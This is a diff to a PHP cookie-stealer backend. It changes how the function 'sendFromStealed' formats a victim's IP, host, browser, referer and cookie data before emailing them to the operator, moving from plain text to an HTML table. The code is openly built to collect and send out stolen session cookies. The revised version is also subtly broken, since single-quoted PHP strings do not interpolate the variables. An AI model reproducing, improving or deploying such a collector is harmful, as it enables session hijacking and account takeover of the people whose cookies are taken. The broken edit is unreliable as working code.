@@ -7,15 +7,18 @@ if (!defined('GimmeCookie')) {
 
 function sendFromStealed($ip, $host, $navigator, $date, $time, $referer, $data)
 {
-	$st = '';
 	// Write stealed data into the string array
-	$st .= "IP: $ip\n";
-	$st .= "HOST: $host\n";
-	$st .= "Browser: $navigator\n";
-	$st .= "Date: $date\n";
-	$st .= "Time: $time\n";
-	$st .= "Referer: $referer\n";
-	$st .= "Data: $data";
+	$message ='
+	<table width="726" border="1">
+	<tr><td>IP:</td><td>Host:</td><td>User-Agent:</td><td>Date:</td><td>Time:</td><td>Referer:</td><td>Cookie:</td></tr>
+	<tr><td>$ip</td>
+		<td>$host</td>
+		<td>$navigator</td>
+		<td>$date</td>
+		<td>$time</td>
+		<td>$referer</td>
+		<td>$data</td></tr>
+	</table>';
 	// Send recieved data on e-mail
-	mail($site['mail'], "You recieved new cookies from $ip", $st);
+	mail($site['mail'], "You recieved new cookies from $ip", $message);
 }
